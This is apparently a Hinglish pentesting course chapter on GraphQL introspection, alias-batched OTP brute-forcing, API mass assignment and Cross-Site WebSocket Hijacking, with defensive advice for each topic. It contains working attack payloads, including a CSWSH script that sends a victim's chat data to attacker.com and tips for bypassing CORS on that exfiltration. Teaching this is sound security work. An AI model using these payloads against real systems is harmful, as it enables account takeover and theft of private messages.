* **Solution:** GraphQL API mein ek single Introspection query bhej kar tum 100% accurate API documentation extract kar sakte ho — bina kisi brute-force ke.
* **What breaks?** Developer sochte hain ki "main endpoint ka naam `deleteUserByAdmin` rakhunga toh kisko pata chalega?" — Introspection se sab expose ho jata hai.
* **✅ Kab use karo:** Jab bhi target URL mein `/graphql` ya `/v1/graphql` dikhe, sabse pehla attack Introspection ka hona chahiye.
* **❌ Kab mat karo / Alternative prefer karo:** Agar Introspection disabled hai, toh field guessing (jaise Clairvoyance tool) try karo, par wahan time zyada lagta hai.

### 🔍 5. Visual / Terminal Mein Kya Dikhega

Jab tum Introspection query bhejoge, tumhe ek massive JSON response milega jisme `"data": {"__schema": {"types": [...]}}` hoga. Is json ke andar saari **queries** (data read karne ke functions) aur **mutations** (data modify/delete karne ke functions) list hongi.

### ⚙️ 6. Under the Hood (Deep Dive — Attack/Defense Flow)

(1) Attacker `/graphql` endpoint pe POST request bhejta hai jisme `__schema` object query kiya gaya hota hai.
(2) GraphQL engine request ko parse karta hai aur dekhta hai ki client internal documentation mang raha hai.
(3) Server poora database structure, object types (`__type`), arguments, aur functions json format mein attacker ko bhej deta hai.
(4) Attacker is schema ko parse karta hai (using tools like InQL) aur aisi **mutations** dhoondhta hai jo public nahi honi chahiye thi (e.g., `updateRole` ya `deleteAccount`).

### 💻 7. Hands-On — Runnable Example (Lab-Ready Commands)

**Standard Introspection Query (cURL se dump karna):**

```bash
# Kali Linux | cURL 7+
1  curl -X POST http://target.com/graphql \           # curl = command line web request tool; -X POST = HTTP POST method use karo; http://target.com/graphql = target API endpoint
2    -H "Content-Type: application/json" \            # -H = HTTP header set karo; batao ki hum JSON data bhej rahe hain
3    -d '{"query": "\n    query IntrospectionQuery {\n      __schema {\n        queryType { name }\n        mutationType { name }\n        types {\n          ...FullType\n        }\n        directives {\n          name\n          description\n          locations\n          args {\n            ...InputValue\n          }\n        }\n      }\n    }\n"}' # -d = POST data body; yeh massive query __schema aur saare types/mutations mang rahi hai

```

```
# 📤 Expected Output:
{"data":{"__schema":{"queryType":{"name":"Query"},"mutationType":{"name":"Mutation"},"types":[{"kind":"SCALAR","name":"String"...

```

**Query Aliasing (Batching Attack) for Rate Limit Bypass:**
Normal rate limit 5 requests/min ho sakti hai. GraphQL mein hum **alias** (nickname) use karke ek hi HTTP request mein 100 queries bhej sakte hain.

```json
# HTTP POST Body | Target: /graphql
1  {
2    "query": "mutation {              # mutation = data change karne ka GraphQL operation
3      req1: login(username: \"admin\", otp: \"1234\") { token }  # req1 = query ka alias; login = function name
4      req2: login(username: \"admin\", otp: \"1235\") { token }  # req2 = doosra alias, same function alag OTP
5      req3: login(username: \"admin\", otp: \"1236\") { token }  # req3 = teesra alias; server sabko ek sath process karega
6    }"
7  }

```

```
# 📤 Expected Output:
{"data":{"req1":{"token":null},"req2":{"token":null},"req3":{"token":"eyJhbGci..."}}}  # req3 ka OTP correct nikla!

```

**🛠️ Step-by-Step GUI Navigation (Burp Suite InQL Extension):**

1. Burp Suite ke BApp Store se **InQL scanner** install karo.
2. Target website navigate karo jahan `/graphql` endpoint ho.
3. Proxy history mein us request pe right-click karo aur "Send to InQL" karo.
4. InQL tab mein jao, wahan woh introspection query automatic bhejega aur saari **queries** aur **mutations** ko folders mein parse karke dikhayega.

### 🔒 8. Attack Surface & Defense (Dual Perspective)

**🔴 Attacker Perspective:** **Schema dumping** se API ka x-ray mil jata hai. Uske baad attacker **hidden endpoints** aur developer-only mutations ko call karke server compromise kar sakta hai. **Batching attacks** se brute-force protection aur rate-limiting asani se bypass ho jati hai.
**🔵 Defender Perspective:** Production environments mein GraphQL introspection hamesha disabled honi chahiye. Query depth aur alias count pe strict limit (e.g., max 5 aliases per request) lagani chahiye.

### 🌍 9. Real-World Penetration Testing Use-Case

Bug bounty platforms (HackerOne, Bugcrowd) par GraphQL bugs bohot common hain. Kai baar companies naya GraphQL backend banati hain aur default settings chhod deti hain. Pentester introspection dump karta hai, wahan usay `changeUserPassword(id: Int!)` jaisi mutation milti hai jo frontend UI mein kabhi dikhti hi nahi thi. Us mutation ko directly call karke account takeover ho jata hai.

### ⚠️ 10. Pentest Anti-Patterns & Common Mistakes (Beginner Traps)

* **❌ Mistake:** Sirf `/graphql` check karna aur na mile toh give up kar dena.
* **🤦 Why:** Beginners sochte hain API humesha default path pe hogi.
* **✅ The 'Pro' Way:** Hamesha `/v1/graphql`, `/api/graphql`, `/v2/graphql`, aur `/graphql/console` jaise endpoints brute-force karo.
* **⚡ Consequences:** Agar custom endpoint pe GraphQL host ho raha hai aur tumne check nahi kiya, toh ek massive vulnerability miss ho jayegi.

### 🤔 11. Agar Dimag Ghoom Raha Hai? (Confusion Clarifier)

* **Confusion 1 — "Kya GraphQL ek naya SQL database hai?"**
* **Galat soch:** Graph"QL" hai matlab SQL injection lagega yahan.
* **Actually:** GraphQL database nahi hai, yeh API banane ka ek tarika hai (jaise REST API). Isme SQLi tabhi lagega jab backend code database queries galat bana raha ho.
* **Prove karo:** GraphQL request intercept karo, usme SQL syntax `SELECT *` nahi, balki JSON jaisa tree structure jaata hai.


* **Confusion 2 — "Alias aur Batching mein kya fark hai?"**
* **Galat soch:** Dono alag alag attacks hain.
* **Actually:** Batching technique ka naam hai (ek sath bohot saara data bhejna), aur Alias (query ka naam badalna) woh tarika hai jisse GraphQL mein batching execute hoti hai. Dono closely related hain.



### 🛠️ 12. Troubleshooting Flowchart (Tool/Exploit Issues)

* **`[InQL Scanner fails to parse the schema]`**
* **Root Cause:** Target server ko authentication `Authorization: Bearer <token>` header chahiye introspection run karne ke liye.
* **Fix:** InQL settings mein jao aur wahan valid user ka Auth header add karo.


* **`[GraphQL responds with "Introspection is disabled"]`**
* **Root Cause:** Server secure hai.
* **Fix:** Schema brute-forcing try karo (Clairvoyance tool se) ya error messages se parameters guess karo.



### ⚖️ 13. Comparison (REST API vs GraphQL API)

| Feature | REST API | GraphQL API |
| --- | --- | --- |
| **Endpoint** | Multiple (`/users`, `/posts`) | Single Endpoint (usually `/graphql`) |
| **Data Fetching** | Over-fetching/Under-fetching common | Exact client-specified data milta hai |
| **Discovery** | Swagger file dhundhni padti hai | Introspection query sab bata deti hai |

### 🔄 14. Kill Chain & Attack Phase Flow

⚔️ **Attack Phase:** Scanning & Enumeration / Exploitation
📍 **Kill Chain Position:** Discovery of attack surface leading to logic exploitation.
🔗 **This connects to:** Rate Limit Bypassing, Authentication Bypass, BOLA (IDOR) in APIs.
🔄 **Flow:** Find `/graphql` endpoint -> Send `__schema` introspection -> Parse all mutations -> Identify sensitive mutation -> Execute exploit / Bypass rate limit with aliasing.

### 🎨 15. Visual Diagram (ASCII Art)

```text
[ Attacker ]
     |
     | 1. POST { query: { __schema { ... } } }
     v
[ GraphQL Endpoint (/graphql) ]
     |
     | 2. Feature Enabled? YES.
     | 3. Generates complete API Map
     v
[ Attacker receives 5MB JSON with all hidden mutations & queries ]

```

### ❓ 16. Interview & Certification Exam Q&A

* **Q: GraphQL mein Query Aliasing kya hoti hai aur attacker iska kya fayda uthate hain?**
* **A:** Query aliasing GraphQL ka feature hai jisse hum ek hi HTTP request mein same function ko alag-alag naam (alias) de kar multiple times call kar sakte hain. Attackers isey use karke single request mein saikdon OTPs ya passwords bhejte hain, jisse standard HTTP-based rate limits (e.g. 5 requests per minute) bypass ho jate hain.


* **Q: Agar GraphQL server par introspection disabled hai, toh kya API 100% secure hai?**
* **A:** Nahi. Introspection band hone se sirf map (documentation) hide hota hai, vulnerabilities (jaise IDOR, SQLi, Mass Assignment) backend functions mein still exist kar sakti hain. Hum field-guessing aur error-based analysis se endpoints discover kar sakte hain.



### 📝 17. One-Line Memory Hook

"Introspection on = API ka x-ray leaked. Aliasing on = Rate limit bypassed."

### 🔑 18. Keywords Coverage Verification

```text
🔑 Keywords Coverage Check — GraphQL Introspection & Exploitation
✅ Covered    : [GraphQL, API endpoints, /graphql, /v1/graphql, Introspection query, __schema, __type, mutations, queries, InQL scanner, query aliasing, batching attacks, rate limit bypass, schema dumping, hidden endpoints]
⚠️ Mentioned but needs more depth : []
❌ MISSED     : []

```

▶️ Resuming from: Topic 2: API Mass Assignment (Auto-binding) — Remaining after this: [None]

### 🎯 2. API Mass Assignment (Auto-binding)

Is topic mein hum REST APIs ka ek bohot common logic flaw seekhenge jise **Mass Assignment** ya **Auto-binding** kehte hain. Hum dekhenge ki kaise developers ka kaam asaan karne wale backend tools (jaise ORM) attacker ko apna JSON payload modify karke privilege escalation (normal user se admin ban jana) karne dete hain.

### 🐣 2. Simple Analogy (Hinglish)

Socho tum college mein admission form bhar rahe ho. Form mein sirf 2 columns hain: "Naam" aur "Course". Par tumne chalaaki se form ke neeche khud ek naya column bana diya: "Fees Paid: YES", aur form submit kar diya. College ka clerk (**ORM — backend framework**) itna aalsi hai ki usne form check hi nahi kiya aur exactly waisa hi data computer mein type kar diya. Tumhari fees bina pay kiye "Paid" ho gayi. APIs mein yahi Mass Assignment hai!

### 📖 3. Technical Definition

* **Precise English:** Mass Assignment (or Auto-binding) is a vulnerability where an application framework automatically binds HTTP request parameters (like a JSON payload) into internal program objects or database records without explicitly filtering or whitelisting them, allowing attackers to overwrite hidden or unauthorized fields.
* **Hinglish Simplification:** Jab API tumhare bheje gaye saare JSON data ko bina filter kiye seedha database mein save kar de, jisse tum apni request mein extra hidden parameters (jaise admin status) add karke system ko trick kar sako.

### 🧠 4. Why This Matters (Pentester/Red Teamer ke liye Zaroorat Kyun Hai?)

* **Problem:** Modern frameworks mein developers **ORM (Object Relational Mapping — code ko database tables se link karne ka tool)** use karte hain. Agar woh explicitly na batayein ki kaunse fields update allow hain, toh ORM sab kuch update kar deta hai.
* **Solution:** Ek attacker parameter guessing (hidden fields ka naam guess karna) se **JSON payload injection** karke account ka control le sakta hai.
* **What breaks?** Ek normal user ek single JSON property add karke poore application ka administrator ban sakta hai.
* **✅ Kab use karo:** Jab bhi API endpoints mein data update (POST, PUT, PATCH) ho raha ho — jaise `/profile/update`, `/user/settings`.
* **❌ Kab mat karo / Alternative prefer karo:** Agar API properly fields ko ignore kar rahi hai (strict whitelisting on hai), toh time waste mat karo, seedha IDOR (Insecure Direct Object Reference) ya BOLA (Broken Object Level Authorization) vulnerabilities dhoondho.

### 🔍 5. Visual / Terminal Mein Kya Dikhega

Original Request: `{"name":"pawan", "email":"p@p.com"}`
Attacker Modified Request: `{"name":"pawan", "email":"p@p.com", "is_admin":true}`
Response: `{"success": true, "user_id": 42, "role": "admin"}` (Screen par success aur naye privileges dikhenge).

### ⚙️ 6. Under the Hood (Deep Dive — Attack Flow)

(1) Attacker `GET /profile` request bhejta hai aur JSON response dekhta hai. Wahan usay pata chalta hai ki ek field `"role": "user"` exist karta hai jo UI mein modify karne ka option nahi hai.
(2) Attacker `PUT /profile` (update request) intercept karta hai.
(3) Attacker khud se payload mein `"role": "admin"` ya `"is_admin": true` inject kar deta hai.
(4) Backend ka aalsi **ORM (Object Relational Mapping)** saare input data ko leta hai aur ek `UPDATE users SET...` SQL query bana kar database mein bhej deta hai.
(5) Database record update ho jata hai aur privilege escalation successful!

### 💻 7. Hands-On — Runnable Example (Lab-Ready Commands)

**cURL se Mass Assignment Exploit:**

```bash
# Kali Linux | cURL 7+
1  curl -X PUT http://target.com/api/v1/users/42 \        # curl = web request tool; -X PUT = update operation; target URL
2    -H "Authorization: Bearer <your_token_here>" \       # -H = header; normal user token pass karo
3    -H "Content-Type: application/json" \                # batate hain ki payload JSON format mein hai
4    -d '{"name":"pawan", "email":"p@p.com", "is_admin":true, "role": 1, "permissions": "admin"}' # -d = data; yahan extra hidden parameters (is_admin, role, permissions) guess karke inject kiye hain

```

```
# 📤 Expected Output:
{"status":"success","message":"Profile updated","data":{"name":"pawan","email":"p@p.com","is_admin":true,"role":1,"permissions":"admin"}}

```

**🛠️ Step-by-Step GUI Navigation (Burp Suite Repeater):**
Instructor ne profile update request pe yeh live demo dikhaya:

1. Target website par apna profile update form fill karo aur "Save" pe click karo.
2. Burp Suite Proxy mein us POST ya PUT request ko intercept karo.
3. Request pe right-click karke **Send to Repeater** (Ctrl+R) karo.
4. JSON body mein jao, wahan `{"name":"pawan", "email":"p@p.com"}` likha hoga.
5. Manually ek naya key-value pair add karo: `{"name":"pawan", "email":"p@p.com", "is_admin":true}`.
6. **Send** dabao aur response check karo. Agar error nahi aaya aur save ho gaya, toh logout karke wapas aao — tumhare paas admin privileges aa chuke honge!

### 🔒 8. Attack Surface & Defense

**🔴 Attacker Perspective:** API vulnerabilities dhoondhte waqt **parameter guessing** (Arjun ya ParamMiner jaisi tools se hidden variables dhoondhna) sabse powerful technique hoti hai. Attacker alag-alag variations (`is_admin`, `isAdmin`, `role: 1`, `role: "admin"`) try karta hai jab tak ORM bind na kar le.
**🔵 Defender Perspective:** DTOs (Data Transfer Objects) use karo. Request payload ko directly database model se bind mat karo. Code mein strictly define karo ki sirf `["name", "email"]` hi update hone allowed hain, baaki sab drop ho jaye.

### 🌍 9. Real-World Penetration Testing Use-Case

Bug bounties mein API endpoints pe yeh flaw dhoondhna ek goldmine hai. Ek real-world scenario mein, attacker ek e-commerce site pe apna profile update kar raha tha. Usne JSON mein `"balance": 999999` aur `"premium_member": true` add kar diya. Backend (Node.js/Mongoose) ne mass assignment allow kiya hua tha, aur attacker ka wallet instantly recharge ho gaya aur VIP status mil gaya.

### ⚠️ 10. Pentest Anti-Patterns & Common Mistakes (Beginner Traps)

* **❌ Mistake:** Sirf wahi parameters bhejna jo UI frontend me dikh rahe hon.
* **🤦 Why:** Beginners ko lagta hai jo form mein boxes hain, sirf wahi server process kar sakta hai.
* **✅ The 'Pro' Way:** Hamesha response JSON check karo. Agar response mein `"role": "user"` aa raha hai, toh same parameter `"role"` update request mein bhejna try karo.
* **⚡ Consequences:** Agar tumne hidden parameters guess nahi kiye, toh ek simple "High" severity Privilege Escalation bug miss ho jayega.

### 🤔 11. Agar Dimag Ghoom Raha Hai? (Confusion Clarifier)

* **Confusion 1 — "Kya Mass Assignment aur SQL Injection same hain?"**
* **Galat soch:** Dono mein database modify ho raha hai toh same attack hua na?
* **Actually:** SQLi mein hum SQL syntax todte hain (using `' OR 1=1 --`). Mass Assignment ek **Logic Flaw** hai, yahan syntax bilkul sahi hota hai, bas developer ne logic mein extra parameter filter nahi kiya.
* **Prove karo:** Apna JSON payload dekho. Hum koi special character nahi bhej rahe, sirf pure valid JSON bhej rahe hain.


* **Confusion 2 — "Mujhe kaise pata chalega hidden parameter ka naam `is_admin` hi hai?"**
* **Galat soch:** "Mujhe source code chahiye guess karne ke liye."
* **Actually:** 3 tarike hain: (1) Target APIs ka response dekho, usually wahan saare keys leak hote hain. (2) Standard naming conventions fuzz karo (`role_id`, `is_admin`, `group`). (3) Swagger/API docs (ya GraphQL introspection) se schema nikal lo.



### 🛠️ 12. Troubleshooting Flowchart (Tool/Exploit Issues)

* **`[Server returns 400 Bad Request when adding parameter]`**
* **Root Cause:** Tumne JSON syntax break kar diya hai (maybe missing comma `,` ya wrong quotes `"`).
* **Fix:** JSON linter use karo, make sure tumhara injected code strict JSON format mein ho: `..., "is_admin": true}` (boolean bina quotes ke, string quotes mein).


* **`[Server returns 200 OK, but privilege is not escalated]`**
* **Root Cause:** Ya toh unhone variable name kuch aur rakha hai (e.g., `role_id` instead of `role`), ya backend parameters explicitly drop kar raha hai (secure).
* **Fix:** Parameter guessing tools (ParamMiner) lagao alag names try karne ke liye.



### ⚖️ 13. Comparison (Mass Assignment vs BOLA/IDOR)

| Feature | Mass Assignment (Auto-binding) | BOLA / IDOR |
| --- | --- | --- |
| **Attack Vector** | Adding/modifying payload properties (e.g., `"role":"admin"`) | Modifying resource identifiers (e.g., `/user/42` -> `/user/43`) |
| **Goal** | Overwrite unpermitted data fields (Privilege Escalation) | Access another user's data (Horizontal/Vertical) |
| **Mitigation** | Strict Whitelisting of object properties | Strict Authorization checks per request |

### 🔄 14. Kill Chain & Attack Phase Flow

⚔️ **Attack Phase:** Privilege Escalation
📍 **Kill Chain Position:** Post-Authentication (Exploiting logic to gain higher access).
🔗 **This connects to:** Account Takeover, Horizontal/Vertical Privilege Escalation.
🔄 **Flow:** Identify endpoint with update logic (PUT/POST) -> Guess or find sensitive hidden parameter names -> Inject into JSON payload -> Gain admin privileges.

### 🎨 15. Visual Diagram (ASCII Art)

```text
[ Malicious JSON Request ]
{
  "name": "pawan",
  "is_admin": true  <-- INJECTED
}
       |
       | (Reaches Backend API)
       v
[ Lazy ORM Engine ]
"Oh, 2 fields received. Let me update both in DB!"
       |
       v
[ Database (users table) ]
UPDATE users SET name='pawan', is_admin=1 WHERE id=42;

```

### ❓ 16. Interview & Certification Exam Q&A

* **Q: Mass Assignment vulnerability kya hoti hai? Ek example do.**
* **A:** Mass assignment tab hota hai jab web framework client request ke saare parameters ko automatically backend database model se bind kar deta hai. Example: User profile update request mein manually `"role": "admin"` inject karna, jisse insecure backend us parameter ko bhi DB mein update kar dega aur user ko admin access mil jayega.


* **Q: Is attack se bachne ka sabse best developer approach kya hai?**
* **A:** Explicit whitelisting ya DTOs (Data Transfer Objects) use karna. Code mein specifically define hona chahiye ki user requests se sirf "name" aur "email" hi extract hoke bind honge, baaki saare aane wale parameters automatically drop ya reject ho jayenge.



### 📝 17. One-Line Memory Hook

"ORM ki aalas, attacker ka fayda — API mein extra JSON field daalo, aur admin ban jao!"

# Section 23.8: WebSocket Vulnerabilities


### 🎯 1. Intercepting WebSockets & CSWSH

Is topic mein hum seekhenge ki WebSocket traffic (`ws://` aur `wss://`) ko kaise intercept karte hain aur Cross-Site WebSocket Hijacking (CSWSH) ke through victim ke private chat messages aur real-time data ko kaise exfiltrate (chura) karte hain.

### 🐣 2. Simple Analogy (Hinglish)

Normal HTTP requests aisi hain jaise Walkie-Talkie pe baat karna — tumne message bheja ("over"), target ne sun ke reply kiya ("over"), aur communication band. Lekin **WebSocket** ek regular phone call ki tarah hai — ek baar call (connection) lag gayi, toh line open rehti hai aur dono taraf se continuously baatein (bidirectional communication) chal sakti hain.

**CSWSH (Cross-Site WebSocket Hijacking)** tab hota hai jab attacker target ke phone line pe apna extension laga de, aur target ka server caller ID (`Origin` header) verify kiye bina usko allow kar de, jisse attacker saari private baatein sun le.

### 📖 3. Technical Definition

* **Precise English:** WebSockets provide full-duplex, bidirectional communication over a single TCP connection. CSWSH is a CSRF-like vulnerability where an attacker tricks a victim's browser into establishing a cross-origin WebSocket connection to a vulnerable server using the victim's session cookies, allowing the attacker to read and exfiltrate sensitive data.
* **Hinglish Simplification:** WebSocket ek continuous connection hai jisme client aur server dono ek doosre ko data bhej sakte hain. CSWSH mein attacker victim ke browser se target server pe ek unauthorized WebSocket connection banata hai taaki real-time data chura sake.

### 🧠 4. Why This Matters

* **Problem:** Normal HTTP web requests mein **SOP** (Same-Origin Policy — browser ki default security jo ek website ko doosri website ka sensitive data padhne se rokti hai) apply hoti hai. Par WebSockets default SOP follow nahi karte. Agar target server `Origin` header validate nahi karega, toh attacker victim ka poora real-time data (chat, stock trade data) chura lega.
* **Solution:** CSWSH testing se hum real-time apps ki authentication aur origin validation weaknesses nikal sakte hain taaki unauthorized persistent (lambe samay tak chalne wale) connections ko block kiya ja sake.
* **What breaks?** Agar app WebSockets use karti hai aur tumne isse test nahi kiya, toh tum ek critical account takeover ya massive data exfiltration (target se data bahar nikalna) vulnerability miss kar doge.
* **✅ Kab use karo:** Jab target application chat features, stock trading tickers, live notifications, ya multiplayer browser games ke liye `ws://` (unencrypted) ya `wss://` (encrypted) use kar rahi ho.
* **❌ Kab mat karo:** Jab app sirf standard REST APIs over HTTP use kar rahi ho — wahan normal **CSRF** (Cross-Site Request Forgery — attacker victim se unauthorized action karwata hai) ya CORS misconfigurations test karo.

### 🔍 5. Visual / Terminal Mein Kya Dikhega

Burp Suite (web application security testing tool) ke **'WebSockets history'** tab mein HTTP/HTTPS ki jagah `ws://` traffic ke messages up/down arrows ke saath dikhenge. Jab tum CSWSH payload run karoge, toh attacker ke listener (terminal) mein victim ke private messages aate hue dikhenge.

### ⚙️ 6. Under the Hood (Deep Dive — Attack Flow)

WebSocket connection banne se pehle ek normal HTTP request jaati hai jisko "Handshake" bolte hain.

**(1) The Handshake:** Victim target site pe login karta hai. Phir woh attacker ke malicious link (`http://attacker.com/exploit.html`) pe click karta hai.
**(2) Connection Request:** Malicious page ka JavaScript target server pe ek HTTP GET request bhejta hai jisme `Upgrade: websocket` hota hai. Browser isme automatically victim ki **authentication cookies** (session maintain karne wale tokens) attach kar deta hai.
**(3) Vulnerability Execution:** Server sirf cookies dekhta hai (jo valid hain) par `Origin: http://attacker.com` header ignore kar deta hai. Server `101 Switching Protocols` HTTP response bhej kar TCP connection (continuous network link) establish kar deta hai.
**(4) Data Exfiltration:** Ab attacker ka malicious JS `onmessage` event (jab bhi socket pe naya data aaye) trigger karta hai. Target server se aane wala data (like chat history) read hota hai aur attacker ke C2 (Command & Control — attacker ka remote server) pe chori-chupe send ho jata hai.

**🛠️ Step-by-Step GUI Navigation (Burp Suite):**

1. Burp Suite mein **Proxy** tab pe jao.
2. **WebSockets history** tab click karo (taaki real-time messages dikhein).
3. HTTP history tab mein jao aur WebSocket handshake request (jisme status `101` ho) find karke Right-click karo -> **Send to Repeater**.
4. Repeater mein `Origin` header ko modify karke `Origin: https://evil.com` daalo.
5. **Send** click karo -> Agar response mein `101 Switching Protocols` aaye, toh target CSWSH ke liye vulnerable hai.

### 💻 7. Hands-On — Runnable Example (Lab-Ready Commands)

**Step 1: Handshake Manipulation in Burp Repeater**
Target chat server ka connection test karte hain Origin spoofing ke saath:

```http
# Burp Suite Repeater
1  GET /chat HTTP/1.1                               # GET request handshake initiate karne ke liye
2  Host: target.com                                 # Host = Target server ka address
3  Origin: http://evil-attacker.com                 # 🔴 VULNERABILITY CHECK: Origin ko malicious domain se spoof kiya
4  Connection: Upgrade                              # Connection header browser ko batata hai ki protocol change karna hai
5  Upgrade: websocket                               # Upgrade = Hum HTTP se WebSocket pe shift hona chahte hain
6  Sec-WebSocket-Version: 13                        # WebSocket protocol ka standard version
7  Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==      # Sec-WebSocket-Key = Random base64 string for handshake validation
8  Cookie: session_id=VictimValidCookie123          # Browser ne victim ki valid authentication cookie automatically attach kardi

```

```
# 📤 Expected Output (from vulnerable server):
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=

```

*(Agar 101 response mil gaya even after spoofed Origin, iska matlab attack successful ho sakta hai).*

**Step 2: The CSWSH Exploit HTML/JS Payload**
Attacker ab ek webpage banata hai aur victim ko bhejta hai. Yeh JS victim ke private messages chura kar attacker server pe bhejega.

```html
# Malicious Webpage: exploit.html
1  <script>
2    // ws = WebSocket object; new WebSocket() se attacker target.com pe connection open karta hai
3    var ws = new WebSocket('wss://target.com/chat'); 
4    
5    // ws.onopen = jab connection successfully ban jaye tab kya karna hai
6    ws.onopen = function() {
7        ws.send("READY");                          # Target server ko dummy message bheja taaki history trigger ho
8    };
9    
10   // ws.onmessage = jab target server victim ka private data wapas bheje
11   ws.onmessage = function(event) {
12       // fetch() = attacker.com pe GET request ke through victim ka data (event.data) exfiltrate (bhejna) kar rahe hain
13       fetch('http://attacker.com/log?data=' + btoa(event.data)); 
14   };
15 </script>

```

```
# 📤 Expected Output (Attacker ke server logs mein):
GET /log?data=eyAidXNlciI6ICJ2aWN0aW0iLCAibWVzc2FnZSI6ICJteSBiYW5rIHBpbiBpcyAxMjM0IiB9 HTTP/1.1 200 OK
(Base64 decode karne par: { "user": "victim", "message": "my bank pin is 1234" })

```

#### 🔬 Code Explanation Rule (LINE-BY-LINE)

* **Line 2-3 (Step 2):** `new WebSocket('wss://target.com/chat')` — Yeh line browser ko force karti hai target pe socket kholne ko. Browser silently victim ki cookies attach kar deta hai. Agar app secure nahi hai, toh connection ban jayega.
* **Line 11-14 (Step 2):** `ws.onmessage` event listener hai. Jaise hi chat server victim ke messages bhejta hai, yeh function unhe capture karta hai. `btoa(event.data)` data ko Base64 encode karta hai taaki URL mein safely transfer ho sake, aur `fetch()` usse seedha attacker ke server pe bhej deta hai.

### 🔒 8. Attack Surface & Defense

**🔴 Attacker Perspective (Red Team):**

* Attackers live chat portals, trading apps, aur dashboard real-time feeds target karte hain.
* Initial handshake mein `Origin` modify karke proof of concept banate hain.
* Malicious HTML host karke target ko spear-phishing ke through link bhejte hain taaki persistent bidirectional data chura sakein.

**🔵 Defender Perspective (Blue Team):**

* Handshake request ke time **`Origin` header ko strictly validate karo**. Agar request unrecognized domain se aaye, toh HTTP 403 Forbidden return karo.
* Initial HTTP WebSocket handshake pe **CSRF tokens** implement karo. (e.g., `wss://target.com/chat?token=RandomCSRFToken`).
* Session state maintain karne ke liye cookies ke badle Bearer Tokens (headers mein) use karo jisse cross-site automatically bhejna impossible ho jata hai.

### 🌍 9. Real-World Penetration Testing Use-Case

Bug bounties (HackerOne/Bugcrowd) mein real-time trading platforms (jaise crypto exchanges jahan live order books `wss://` se chalte hain) pe CSWSH ki hunting highly profitable hoti hai (Critical severity). Ek real-world report mein attacker ne CSWSH exploit likha jo victim ke behalf par automatically trade execute karta tha aur balance information attacker server pe exfiltrate karta tha, jiske liye $10,000+ ki bounty di gayi thi.

### ⚠️ 10. Pentest Anti-Patterns & Common Mistakes (Beginner Traps)

* **❌ Mistake:** Sirf HTTP history check karna aur Burp mein 'WebSockets history' tab ko ignore kar dena.
* **🤦 Why:** Beginners ko lagta hai ki saari vulnerabilities HTTP requests mein hi milti hain.
* **✅ The 'Pro' Way:** Jab bhi app mein live notification ya chat dikhe, immediately WebSockets history tab verify karo.
* **⚡ Consequences:** Agar ignore kiya, toh tum app ki sabse critical RCE, XSS ya CSWSH flaws miss kar doge.
* **❌ Mistake:** Sochna ki `wss://` use ho raha hai isliye app secure hai.
* **🤦 Why:** `wss://` (secure WebSocket) sirf in-transit data encrypt karta hai (like HTTPS), yeh cross-site access ya authentication logic flaws (CSWSH) ko nahi rokta.
* **✅ The 'Pro' Way:** `wss://` hone ke bawajood Origin header manipulation test karo.
* **⚡ Consequences:** False sense of security banegi aur client ko vulnerability ki report nahi jayegi.

### 🤔 11. Agar Dimag Ghoom Raha Hai? (Confusion Clarifier)

* **Confusion 1 — "CSWSH aur HTTP CSRF mein kya fark hai?"**
* **Galat soch:** Dono same hi toh hain, bas URL alag hai.
* **Actually:** CSRF "blind" attack hai (ek-tarfa). Tum request bhej sakte ho, par response padh nahi sakte (SOP ki wajah se). Lekin CSWSH mein tum connection banate ho aur us continuous connection se saara private data **padh** bhi sakte ho (Two-way).
* **Prove karo:** CSRF payload ka output attacker ko nahi dikhta. CSWSH mein upar diye JavaScript mein `fetch()` ke through attacker poora response read kar raha hai.


* **Confusion 2 — "Kya `wss://` (Secure) hone par CSWSH ruk jayega?"**
* **Galat soch:** `wss://` matlab encrypted, toh hacking nahi ho sakti.
* **Actually:** `wss://` sirf network pe data encrypt karta hai (MITM se bachata hai). Lekin CSWSH mein toh browser explicitly legit encrypted connection hi bana raha hai, problem yeh hai ki server verified domain check nahi kar raha.
* **Prove karo:** Burp Repeater mein `wss://` endpoint par request bhejo `Origin: evil.com` ke saath. Agar 101 response aaya, toh encryption hone ke baad bhi server vulnerable hai.


* **Confusion 3 — "Handshake HTTP pe kyun hota hai, seedha WebSocket pe kyun nahi?"**
* **Galat soch:** WebSocket ka apna alag port aur initial connection process hota hoga.
* **Actually:** WebSocket protocol design hi aisa hai ki woh normal web ports (80/443) share kar sake. Isliye initial connection normal HTTP GET request hota hai, jiske baad `Upgrade` header use karke ussi connection ko socket mein convert kar diya jata hai.
* **Prove karo:** Burp Proxy history (HTTP tab) mein dekho — connection humesha HTTP 1.1 ki request se start hoga, WebSockets history mein directly nahi jayega.



### 🛠️ 12. Troubleshooting Flowchart (Tool/Exploit Issues)

* **`Burp WebSockets history tab is completely empty`**
* **Root Cause:** Ya toh app WebSockets use hi nahi kar rahi (shayad AJAX polling use kar rahi ho), ya tumhara Burp scope filter WebSocket traffic hide kar raha hai.
* **Fix:** Burp History options mein jao aur ensure karo "Hide items not in scope" disabled hai. Target app ko interact karo aur dekho `101 Switching Protocols` response aa raha hai ya nahi.


* **`Repeater mein Origin spoof karne par 403 Forbidden aa raha hai`**
* **Root Cause:** Target server ka back-end securely configured hai aur Origin validate kar raha hai.
* **Fix:** Target secure hai. Par ek last test karo: null origin (`Origin: null`) try karo, ya subdomain spoofing try karo (e.g., `Origin: https://attacker.target.com`). Agar phir bhi 403 hai, toh vulnerability nahi hai.


* **`Exploit script victim browser mein chali, par attacker.com par data nahi aaya (CORS Error in Victim's Console)`**
* **Root Cause:** CSWSH successful ho gaya target.com se, par jab `fetch()` attacker server (`attacker.com`) pe data bhejna chaha, toh attacker ke server ne proper CORS headers set nahi kiye the jisse victim ke browser ne fetch block kar diya.
* **Fix:** `fetch('http://attacker.com/log...', {mode: 'no-cors'})` use karo payload mein, ya attacker server pe `Access-Control-Allow-Origin: *` header set karo.



### ⚖️ 13. Comparison (CSRF vs CSWSH)

| Feature | Traditional CSRF | CSWSH (WebSocket Hijacking) |
| --- | --- | --- |
| **Protocol** | Standard HTTP | WebSocket (`ws://` / `wss://`) |
| **Communication** | One-way (Blind execution) | Two-way (Bidirectional) |
| **Reading Data** | ❌ Cannot read response (Blocked by SOP) | ✅ Can read response/data freely |
| **Primary Goal** | State change (Change password, send money) | Data Exfiltration (Read live chat, streams) |
| **Mitigation** | Anti-CSRF tokens | Origin Validation + Anti-CSRF tokens in handshake |

### 🔄 14. Kill Chain & Attack Phase Flow

